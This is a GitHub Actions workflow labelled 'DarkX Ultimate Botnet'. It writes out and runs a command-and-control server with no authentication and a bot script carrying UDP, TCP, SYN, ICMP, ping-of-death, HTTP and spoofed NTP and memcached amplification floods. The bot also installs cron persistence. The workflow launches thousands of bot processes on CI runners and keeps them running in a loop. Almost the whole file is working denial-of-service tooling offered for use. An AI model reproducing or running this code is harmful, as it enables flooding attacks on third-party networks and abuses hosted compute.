name: DarkX Ultimate Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'

jobs:
  deploy-darkx-ultimate:
    runs-on: ubuntu-latest
    timeout-minutes: 4320

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Ultimate Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing ultimate dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
        sudo apt install -y nmap masscan hydra john netcat-openbsd
        sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
        pip3 install requests paramiko scapy cryptography colorama cloudscraper icmplib socks PySockets

    - name: Install Tailscale
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
        echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Create KryptonC2 CNC with All Original Methods
      run: |
        cd darkx
        cat > cnc.py << 'EOF'
        #!/usr/bin/env python3
        import socket
        import threading
        import time
        import random
        import subprocess
        import struct
        from colorama import Fore, init
        
        init(convert=True)
        
        banner = f'''
        {Fore.CYAN}
            â–ˆâ–ˆ â–„â–ˆâ–€ â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ â–“â–ˆâ–ˆ   â–ˆâ–ˆâ–“ â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆ  â–„â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–„    â–ˆ 
            â–ˆâ–ˆâ–„â–ˆâ–’ â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–’â–ˆâ–ˆ  â–ˆâ–ˆâ–’â–“â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–“  â–ˆâ–ˆâ–’ â–“â–’â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’ â–ˆâ–ˆ â–€â–ˆ   â–ˆ 
            â–“â–ˆâ–ˆâ–ˆâ–„â–‘ â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’ â–’â–ˆâ–ˆ â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–“â–’â–’ â–“â–ˆâ–ˆâ–‘ â–’â–‘â–’â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ  â–€â–ˆ â–ˆâ–ˆâ–’
            â–“â–ˆâ–ˆ â–ˆâ–„ â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„   â–‘ â–â–ˆâ–ˆâ–“â–‘â–’â–ˆâ–ˆâ–„â–ˆâ–“â–’ â–’â–‘ â–“â–ˆâ–ˆâ–“ â–‘ â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆâ–’  â–â–Œâ–ˆâ–ˆâ–’
            â–’â–ˆâ–ˆâ–’ â–ˆâ–„â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’ â–‘ â–ˆâ–ˆâ–’â–“â–‘â–’â–ˆâ–ˆâ–’ â–‘  â–‘  â–’â–ˆâ–ˆâ–’ â–‘ â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–‘   â–“â–ˆâ–ˆâ–‘
            â–’ â–’â–’ â–“â–’â–‘ â–’â–“ â–‘â–’â–“â–‘  â–ˆâ–ˆâ–’â–’â–’ â–’â–“â–’â–‘ â–‘  â–‘  â–’ â–‘â–‘   â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–‘   â–’ â–’ 
            â–‘ â–‘â–’ â–’â–‘  â–‘â–’ â–‘ â–’â–‘â–“â–ˆâ–ˆ â–‘â–’â–‘ â–‘â–’ â–‘         â–‘      â–‘ â–’ â–’â–‘ â–‘ â–‘â–‘   â–‘ â–’â–‘
            â–‘ â–‘â–‘ â–‘   â–‘â–‘   â–‘ â–’ â–’ â–‘â–‘  â–‘â–‘         â–‘      â–‘ â–‘ â–‘ â–’     â–‘   â–‘ â–‘ 
            â–‘  â–‘      â–‘     â–‘ â–‘                           â–‘ â–‘           â–‘ 
                            â–‘ â–‘                                           
        
        {Fore.WHITE}            DarkX Ultimate - NO AUTH REQUIRED
        {Fore.YELLOW}            Type "help" for commands
        {Fore.GREEN}            Bots Online: 0
        '''
        
        class DarkXCNC:
            def __init__(self, host='0.0.0.0', port=5555):
                self.host = host
                self.port = port
                self.bots = []
                self.bot_lock = threading.Lock()
                self.running = True
                
            def start_server(self):
                try:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    self.sock.bind((self.host, self.port))
                    self.sock.listen(500)
                    print(f"{Fore.GREEN}ðŸš€ DarkX CNC Server started on {self.host}:{self.port}")
                    print(f"{Fore.RED}ðŸ”¥ NO AUTHENTICATION REQUIRED")
                    
                    # Start bot ping thread
                    threading.Thread(target=self.ping_bots, daemon=True).start()
                    
                    while self.running:
                        try:
                            client_socket, client_address = self.sock.accept()
                            threading.Thread(target=self.handle_client, args=(client_socket, client_address), daemon=True).start()
                        except Exception as e:
                            if self.running:
                                print(f"{Fore.RED}Error accepting connection: {e}")
                except Exception as e:
                    print(f"{Fore.RED}Failed to start server: {e}")
                    
            def ping_bots(self):
                while self.running:
                    dead_bots = []
                    with self.bot_lock:
                        for bot in self.bots:
                            try:
                                bot.settimeout(3)
                                bot.send(b'PING')
                                response = bot.recv(1024).decode().strip()
                                if response != 'PONG':
                                    dead_bots.append(bot)
                            except:
                                dead_bots.append(bot)
                    
                    for bot in dead_bots:
                        with self.bot_lock:
                            if bot in self.bots:
                                self.bots.remove(bot)
                        bot.close()
                    
                    time.sleep(5)
                    
            def handle_client(self, client_socket, client_address):
                try:
                    # Check if it's a bot or user
                    client_socket.settimeout(5.0)
                    initial_data = client_socket.recv(1024).decode().strip()
                    
                    if initial_data == "BOT_CONNECTED":
                        # It's a bot
                        with self.bot_lock:
                            self.bots.append(client_socket)
                        print(f"{Fore.GREEN}ðŸ¤– New bot connected: {client_address[0]} (Total: {len(self.bots)})")
                        client_socket.send(b"Connected to DarkX CNC\n")
                        
                        # Keep bot connection alive
                        while True:
                            try:
                                data = client_socket.recv(1024).decode().strip()
                                if not data:
                                    break
                                if data == "PING":
                                    client_socket.send(b"PONG\n")
                            except:
                                break
                    else:
                        # It's a user - NO AUTHENTICATION
                        self.handle_user(client_socket)
                        
                except Exception as e:
                    print(f"{Fore.RED}Error handling client: {e}")
                finally:
                    with self.bot_lock:
                        if client_socket in self.bots:
                            self.bots.remove(client_socket)
                            print(f"{Fore.YELLOW}ðŸ¤– Bot disconnected: {client_address[0]} (Total: {len(self.bots)})")
                    try:
                        client_socket.close()
                    except:
                        pass
                    
            def handle_user(self, client_socket):
                try:
                    # Send banner with current bot count
                    bot_count = len(self.bots)
                    welcome_banner = banner.replace("Bots Online: 0", f"Bots Online: {bot_count}")
                    
                    client_socket.send(welcome_banner.encode())
                    client_socket.send(f"\n{Fore.WHITE}Connected Bots: {bot_count}\n\n".encode())
                    
                    while True:
                        client_socket.send(f"{Fore.CYAN}darkx> {Fore.WHITE}".encode())
                        data = client_socket.recv(1024).decode().strip()
                        if not data:
                            break
                            
                        command = data.upper()
                        
                        if command == "BOTS":
                            client_socket.send(f"{Fore.GREEN}Connected Bots: {len(self.bots)}\n".encode())
                            
                        elif command.startswith("."):
                            # KryptonC2 style commands
                            self.handle_krypton_command(client_socket, data)
                            
                        elif command == "HELP":
                            help_text = f"""
        {Fore.CYAN}KryptonC2 Commands:
        {Fore.WHITE}.udp [IP] [PORT] [TIME] [SIZE]     {Fore.YELLOW}- UDP Flood
        {Fore.WHITE}.tcp [IP] [PORT] [TIME] [SIZE]     {Fore.YELLOW}- TCP Flood  
        {Fore.WHITE}.syn [IP] [PORT] [TIME]           {Fore.YELLOW}- SYN Flood
        {Fore.WHITE}.icmp [IP] [TIME]                 {Fore.YELLOW}- ICMP Flood
        {Fore.WHITE}.hex [IP] [PORT] [TIME]           {Fore.YELLOW}- HEX Flood
        {Fore.WHITE}.ntp [IP] [PORT] [TIME]           {Fore.YELLOW}- NTP Amplification
        {Fore.WHITE}.mem [IP] [PORT] [TIME]           {Fore.YELLOW}- Memcached Flood
        {Fore.WHITE}.pod [IP] [TIME]                  {Fore.YELLOW}- Ping of Death
        
        {Fore.WHITE}bots                              {Fore.YELLOW}- Show connected bots
        {Fore.WHITE}help                              {Fore.YELLOW}- Show this help
        {Fore.WHITE}clear                             {Fore.YELLOW}- Clear screen
        {Fore.WHITE}exit                              {Fore.YELLOW}- Disconnect
        
        {Fore.GREEN}Example: .udp 1.1.1.1 80 60 1024
                            """
                            client_socket.send(help_text.encode())
                            
                        elif command == "CLEAR" or command == "CLS":
                            client_socket.send(b"\033[2J\033[H")
                            client_socket.send(welcome_banner.encode())
                            
                        elif command == "EXIT":
                            client_socket.send(f"{Fore.YELLOW}Goodbye!\n".encode())
                            break
                            
                        else:
                            client_socket.send(f"{Fore.RED}Unknown command. Type 'help' for commands.\n".encode())
                            
                except Exception as e:
                    print(f"{Fore.RED}Error handling user: {e}")
                    
            def handle_krypton_command(self, client_socket, command):
                try:
                    parts = command.split(" ")
                    cmd = parts[0].upper()
                    
                    # Send command to all bots
                    with self.bot_lock:
                        for bot in self.bots:
                            try:
                                bot.send(f"{command}\n".encode())
                            except:
                                pass
                    
                    client_socket.send(f"{Fore.GREEN}âœ… Command sent to {len(self.bots)} bots\n".encode())
                    
                except Exception as e:
                    client_socket.send(f"{Fore.RED}Error processing command: {e}\n".encode())
                    
            def stop_server(self):
                self.running = False
                try:
                    self.sock.close()
                except:
                    pass
                    
        if __name__ == "__main__":
            cnc = DarkXCNC(port=5555)
            try:
                cnc.start_server()
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}ðŸ›‘ Shutting down CNC server...")
                cnc.stop_server()
        EOF

    - name: Create Bot with All KryptonC2 Methods
      run: |
        cd darkx
        cat > bot.py << 'EOF'
        #!/usr/bin/env python3
        import socket
        import threading
        import time
        import subprocess
        import random
        import os
        import requests
        import cloudscraper
        import socks
        import ssl
        from scapy.all import *
        from icmplib import ping as icmp_ping
        from urllib.parse import urlparse
        
        # KryptonC2 Attack Methods
        def attack_udp(ip, port, secs, size):
            end_time = time.time() + int(secs)
            while time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    dport = random.randint(1, 65535) if port == 0 else port
                    data = random._urandom(int(size))
                    s.sendto(data, (ip, dport))
                    s.close()
                except:
                    pass

        def attack_tcp(ip, port, secs, size):
            end_time = time.time() + int(secs)
            while time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, int(port)))
                    while time.time() < end_time:
                        s.send(random._urandom(int(size)))
                    s.close()
                except:
                    pass

        def attack_syn(ip, port, secs):
            end_time = time.time() + int(secs)
            while time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, int(port)))
                    flags = 0b01000000
                    pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
                    while time.time() < end_time:
                        s.send(pkt)
                    s.close()
                except:
                    pass

        def attack_icmp(ip, secs):
            end_time = time.time() + int(secs)
            while time.time() < end_time:
                try:
                    packet = random._urandom(random.randint(1024, 60000))
                    icmp_ping(ip, count=10, interval=0.2, payload_size=len(packet), payload=packet)
                except:
                    pass

        def attack_pod(ip, secs):
            end_time = time.time() + int(secs)
            while time.time() < end_time:
                try:
                    rand_addr = spoofer()
                    ip_hdr = IP(src=rand_addr, dst=ip)
                    packet = ip_hdr / ICMP() / ("m" * 60000)
                    send(packet, verbose=0)
                except:
                    pass

        def spoofer():
            addr = [192, 168, 0, 1]
            d = '.'
            addr[0] = str(random.randrange(11, 197))
            addr[1] = str(random.randrange(0, 255))
            addr[2] = str(random.randrange(0, 255))
            addr[3] = str(random.randrange(2, 254))
            return addr[0] + d + addr[1] + d + addr[2] + d + addr[3]

        def attack_hex(ip, port, secs):
            payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
            end_time = time.time() + int(secs)
            while time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(payload, (ip, int(port)))
                    s.sendto(payload, (ip, int(port)))
                    s.sendto(payload, (ip, int(port)))
                    s.close()
                except:
                    pass

        ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
        def attack_ntp(ip, port, secs):
            end_time = time.time() + int(secs)
            while time.time() < end_time:
                try:
                    with open("ntpServers.txt", "r") as f:
                        ntp_servers = f.readlines()
                    server = random.choice(ntp_servers).strip()
                    packet = (IP(dst=server, src=ip) / 
                             UDP(sport=random.randint(1, 65535), dport=int(port)) / 
                             Raw(load=ntp_payload))
                    send(packet, count=random.randint(10, 150), verbose=0)
                except:
                    pass

        mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        def attack_mem(ip, port, secs):
            end_time = time.time() + int(secs)
            while time.time() < end_time:
                try:
                    with open("memsv.txt", "r") as f:
                        memsv = f.readlines()
                    server = random.choice(memsv).strip()
                    packet = (IP(dst=server, src=ip) / 
                             UDP(sport=int(port), dport=11211) / 
                             Raw(load=mem_payload))
                    send(packet, count=random.randint(1024, 60000), verbose=0)
                except:
                    pass

        def attack_http_get(url, port, secs):
            end_time = time.time() + int(secs)
            scraper = cloudscraper.create_scraper()
            while time.time() < end_time:
                try:
                    headers = {'User-Agent': random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
                    ])}
                    target = f"http://{url}:{port}"
                    for _ in range(1500):
                        requests.get(target, headers=headers, timeout=2)
                        scraper.get(target, headers=headers, timeout=2)
                except:
                    pass

        class DarkXBot:
            def __init__(self, cnc_ip, cnc_port=5555):
                self.cnc_ip = cnc_ip
                self.cnc_port = cnc_port
                self.running = True
                self.methods = {
                    '.UDP': attack_udp,
                    '.TCP': attack_tcp, 
                    '.SYN': attack_syn,
                    '.ICMP': attack_icmp,
                    '.POD': attack_pod,
                    '.HEX': attack_hex,
                    '.NTP': attack_ntp,
                    '.MEM': attack_mem,
                    '.HTTPGET': attack_http_get
                }
                
            def connect_to_cnc(self):
                while self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(30)
                        sock.connect((self.cnc_ip, self.cnc_port))
                        
                        # Identify as bot
                        sock.send(b"BOT_CONNECTED\n")
                        print(f"âœ… Connected to CNC at {self.cnc_ip}:{self.cnc_port}")
                        
                        # Handle commands from CNC
                        while self.running:
                            try:
                                data = sock.recv(1024).decode().strip()
                                if not data:
                                    break
                                    
                                if data.startswith("."):
                                    self.execute_krypton_command(data)
                                        
                                elif data == "PING":
                                    sock.send(b"PONG\n")
                                    
                            except socket.timeout:
                                continue
                            except Exception as e:
                                break
                                
                        sock.close()
                        print("âŒ Disconnected from CNC, reconnecting...")
                        
                    except Exception as e:
                        print(f"âŒ Connection failed: {e}")
                        
                    time.sleep(10)
                    
            def execute_krypton_command(self, command):
                try:
                    parts = command.split(" ")
                    cmd = parts[0].upper()
                    
                    if cmd in self.methods:
                        if cmd == '.UDP' and len(parts) >= 5:
                            self.methods[cmd](parts[1], parts[2], parts[3], parts[4])
                        elif cmd == '.TCP' and len(parts) >= 5:
                            self.methods[cmd](parts[1], parts[2], parts[3], parts[4])
                        elif cmd == '.SYN' and len(parts) >= 4:
                            self.methods[cmd](parts[1], parts[2], parts[3])
                        elif cmd == '.ICMP' and len(parts) >= 3:
                            self.methods[cmd](parts[1], parts[2])
                        elif cmd == '.POD' and len(parts) >= 3:
                            self.methods[cmd](parts[1], parts[2])
                        elif cmd == '.HEX' and len(parts) >= 4:
                            self.methods[cmd](parts[1], parts[2], parts[3])
                        elif cmd == '.NTP' and len(parts) >= 4:
                            self.methods[cmd](parts[1], parts[2], parts[3])
                        elif cmd == '.MEM' and len(parts) >= 4:
                            self.methods[cmd](parts[1], parts[2], parts[3])
                        elif cmd == '.HTTPGET' and len(parts) >= 4:
                            self.methods[cmd](parts[1], parts[2], parts[3])
                            
                        print(f"ðŸš€ Executed: {command}")
                    else:
                        print(f"âŒ Unknown command: {cmd}")
                        
                except Exception as e:
                    print(f"âŒ Command error: {e}")
                    
            def install_persistence(self):
                try:
                    subprocess.run([
                        "bash", "-c", 
                        "(crontab -l 2>/dev/null; echo '@reboot python3 /tmp/darkx_bot.py') | crontab -"
                    ], check=True)
                    print("âœ… Persistence installed")
                except Exception as e:
                    print(f"âŒ Persistence failed: {e}")
                    
            def start(self):
                print("ðŸ¤– DarkX Bot Starting with KryptonC2 Methods...")
                self.install_persistence()
                self.connect_to_cnc()
                
        if __name__ == "__main__":
            cnc_ip = "CNC_IP_PLACEHOLDER"
            bot = DarkXBot(cnc_ip)
            bot.start()
        EOF

    - name: Configure Components
      run: |
        cd darkx
        echo "Configuring DarkX components..."
        
        # Update bot with real CNC IP
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.CNC_IP }}/g" bot.py
        
        # Make scripts executable
        chmod +x cnc.py
        chmod +x bot.py
        
        # Copy bot to persistent location
        cp bot.py /tmp/darkx_bot.py
        chmod +x /tmp/darkx_bot.py
        
        # Create required files
        echo "pool.ntp.org" > ntpServers.txt
        echo "memcached.server.com" > memsv.txt
        
        echo "Components configured successfully"

    - name: Start CNC Server
      run: |
        cd darkx
        echo "ðŸš€ Starting DarkX CNC Server..."
        nohup python3 cnc.py > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        sleep 5
        echo "âœ… CNC Server started on port 5555"

    - name: Deploy Initial Bots
      run: |
        cd darkx
        echo "ðŸ¤– Deploying initial bot army..."
        
        # Deploy bots based on power level
        case "${{ github.event.inputs.power }}" in
            "100mb") COUNT=500 ;;
            "1gb") COUNT=2000 ;;
            "10gb") COUNT=8000 ;;
            "100gb") COUNT=20000 ;;
            "1tb") COUNT=50000 ;;
        esac
        
        echo "Deploying $COUNT bots..."
        
        for i in $(seq 1 $COUNT); do
            nohup python3 bot.py >/dev/null 2>&1 &
        done
        
        echo "âœ… Initial bots deployed"
        sleep 10

    - name: Display Dashboard
      run: |
        echo ""
        echo "=========================================="
        echo "        DARKX ULTIMATE BOTNET"
        echo "=========================================="
        echo "ðŸ”¥ NO AUTHENTICATION REQUIRED"
        echo "ðŸ’ª Power Level:    ${{ github.event.inputs.power }}"
        echo "ðŸ”„ Recruitment:    ${{ github.event.inputs.recruitment }}"
        echo "ðŸŒ DarkX CNC:      ${{ env.CNC_IP }}:5555"
        echo "ðŸš€ Bot Deployment: ACTIVE"
        echo "ðŸ’¥ Target Power:   400+ Gbps"
        echo "=========================================="
        echo "ðŸ“¡ Connect: nc ${{ env.CNC_IP }} 5555"
        echo "ðŸ’» KryptonC2 Commands:"
        echo "   .udp [IP] [PORT] [TIME] [SIZE]"
        echo "   .tcp [IP] [PORT] [TIME] [SIZE]"
        echo "   .syn [IP] [PORT] [TIME]"
        echo "   .icmp [IP] [TIME]"
        echo "   .hex [IP] [PORT] [TIME]"
        echo "   .ntp [IP] [PORT] [TIME]"
        echo "   .mem [IP] [PORT] [TIME]"
        echo "   .pod [IP] [TIME]"
        echo ""
        echo "Example: .udp 1.1.1.1 80 60 1024"
        echo "=========================================="
        echo ""

    - name: Maintain System
      run: |
        echo "ðŸ›¡ï¸ DarkX Ultimate Active - Monitoring System"
        
        while true; do
          # Check if CNC is running
          if ! ps -p $CNC_PID > /dev/null 2>&1; then
            echo "ðŸ”„ Restarting CNC Server..."
            cd darkx
            nohup python3 cnc.py > cnc_restart.log 2>&1 &
            CNC_PID=$!
          fi
          
          # Show real-time stats
          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
          TOTAL_PROCESSES=$(ps aux | grep "python3 bot.py" | grep -v grep | wc -l)
          ESTIMATED_POWER=$((CONNECTED_BOTS * 100))
          
          echo "[$(date +'%H:%M:%S')] Stats:"
          echo "  ðŸ¤– Connected Bots: $CONNECTED_BOTS"
          echo "  ðŸ“Š Total Processes: $TOTAL_PROCESSES"
          echo "  âš¡ Estimated Power: $ESTIMATED_POWER Mbps"
          echo "  ðŸŒ CNC Status: ACTIVE"
          
          # Auto-scale if needed
          if [ $CONNECTED_BOTS -lt 1000 ]; then
            echo "âž• Deploying more bots..."
            cd darkx
            for i in {1..500}; do
              nohup python3 bot.py >/dev/null 2>&1 &
            done
          fi
          
          sleep 30
        done
